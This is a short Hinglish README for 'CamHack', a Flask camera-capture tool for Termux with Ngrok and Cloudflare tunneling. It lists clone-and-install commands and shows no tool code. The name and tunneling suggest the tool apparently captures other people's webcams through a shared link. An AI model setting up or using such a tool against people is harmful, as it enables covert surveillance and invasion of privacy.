# CamHack
**CamHack** ek simple Flask-based camera capture tool hai jo **Termux** par chalega. Ismein **localhost**, **Ngrok**, aur **Cloudflare** tunneling options hain.

---

## Installation aur Setup Instructions

### Step 1: **Repository Clone Karein**

Sabse pehle repository ko apne system par clone karein:

```bash
git clone https://github.com/tahiriqbal756/CamHack.git
cd CamHack
pip install flask
pkg install ngrok
pkg install cloudflared
pkg install python
pkg install termux-api
termux-setup-storage
python TF.py
